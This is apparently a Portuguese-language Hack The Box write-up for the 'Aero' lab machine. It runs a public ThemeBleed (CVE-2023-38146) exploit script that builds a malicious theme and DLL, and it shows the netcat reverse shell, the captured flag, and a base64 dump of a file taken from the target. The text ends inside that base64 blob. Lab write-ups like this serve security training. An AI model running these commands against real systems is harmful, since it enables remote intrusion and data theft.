# Writeup Aero

## Scan

```bash
# Nmap 7.93 scan initiated Thu Jan 11 21:54:51 2024 as: nmap -A -sC -Pn -oN fullnmap.txt -p- -T5 -v aerohub.htb
Nmap scan report for aerohub.htb (10.129.229.128)
Host is up (0.25s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Aero Theme Hub
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): FreeBSD 6.X (87%), Microsoft Windows 10|2008 (87%)
OS CPE: cpe:/o:freebsd:freebsd:6.2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2008:r2
Aggressive OS guesses: FreeBSD 6.2-RELEASE (87%), Microsoft Windows 10 (87%), Microsoft Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.005 days (since Thu Jan 11 21:51:58 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   265.26 ms 10.10.14.1
2   265.46 ms aerohub.htb (10.129.229.128)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 11 21:59:27 2024 -- 1 IP address (1 host up) scanned in 275.61 seconds
```

## Enumeration & Exploitation

​	Ao enumerar a página WEB, descobrimos que o host usa um sistema de temas do Windows 11 e ao pesquisar sobre, podemos identificar uma CVE (CVE-2023-38146).

![](ss/info.png)

![](ss/vuln_info.png)

​	Ao procurar por exploits, podemos encontrar a seguinte [PoC](https://github.com/Jnnshschl/CVE-2023-38146/) em python.

​	O exploit cria um arquivo theme malicioso e ao fazermos upload na máquina (arquivo **evil_theme.theme**), obteremos shell reversa.

```bash
┌──(kali㉿kali)-[~/…/HTB/Aero/CVE-2023-38146]
└─$ python3 themebleed.py -r 10.10.15.10 -p 1234
2024-01-11 22:15:51,978 INFO> ThemeBleed CVE-2023-38146 PoC [https://github.com/Jnnshschl]
2024-01-11 22:15:51,979 INFO> Credits to -> https://github.com/gabe-k/themebleed, impacket and cabarchive

2024-01-11 22:15:52,842 INFO> Compiled DLL: "./tb/Aero.msstyles_vrf_evil.dll"
2024-01-11 22:15:52,843 INFO> Theme generated: "evil_theme.theme"
2024-01-11 22:15:52,843 INFO> Themepack generated: "evil_theme.themepack"

2024-01-11 22:15:52,843 INFO> Remember to start netcat: rlwrap -cAr nc -lvnp 1234
2024-01-11 22:15:52,843 INFO> Starting SMB server: 10.10.15.10:445

2024-01-11 22:15:52,844 INFO> Config file parsed
2024-01-11 22:15:52,844 INFO> Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2024-01-11 22:15:52,844 INFO> Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2024-01-11 22:15:52,844 INFO> Config file parsed
2024-01-11 22:15:52,844 INFO> Config file parsed
```

![](ss/upload.png)

```bash
┌──(kali㉿kali)-[~/…/HTB/Aero/CVE-2023-38146/]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.15.10] from (UNKNOWN) [10.129.176.79] 55523
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
aero\sam.emerson
PS C:\Windows\system32> cat C:\Users\sam.emerson\Desktop\user.txt
cat C:\Users\sam.emerson\Desktop\user.txt
f85513500b9875755014150d511cc312
PS C:\Windows\system32> 
```

## Privilege Escalation

​	Depois de pegar a flag, podemos encontrar um arquivo pdf chamado **CVE-2023-28252_Summary.pdf** na pasta `C:\users\sam.emerson\documents`.

​	O nome do arquivo já serve de dica para o que devemos procurar, mas, se quisermos ler o conteúdo do pdf, podemos converter em base64 e depois desencodar em nossa máquina.

```powershell
PS C:\users\sam.emerson\documents> [convert]::ToBase64String((Get-Content -path "CVE-2023-28252_Summary.pdf" -Encoding byte))
[convert]::ToBase64String((Get-Content -path "CVE-2023-28252_Summary.pdf" -Encoding byte))
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